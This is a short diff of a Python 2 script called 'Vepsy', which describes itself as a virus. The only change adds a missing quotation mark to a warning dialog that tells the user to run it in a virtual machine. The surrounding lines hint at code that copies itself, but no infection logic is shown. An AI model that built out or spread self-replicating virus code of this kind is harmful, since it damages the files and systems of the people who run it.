@@ -1,7 +1,7 @@
 ##### VEPSY START #####
 import sys, glob, re, tkMessageBox
 
-tkMessageBox.showinfo(title="WARNING", message="You are about to run Vepsy. This is a virus, and the owner is not responsible for any damages caused. USE IN VM!)
+tkMessageBox.showinfo(title="WARNING", message="You are about to run Vepsy. This is a virus, and the owner is not responsible for any damages caused. USE IN VM!")
 
 #get copy of Vepsy
 vCode = []
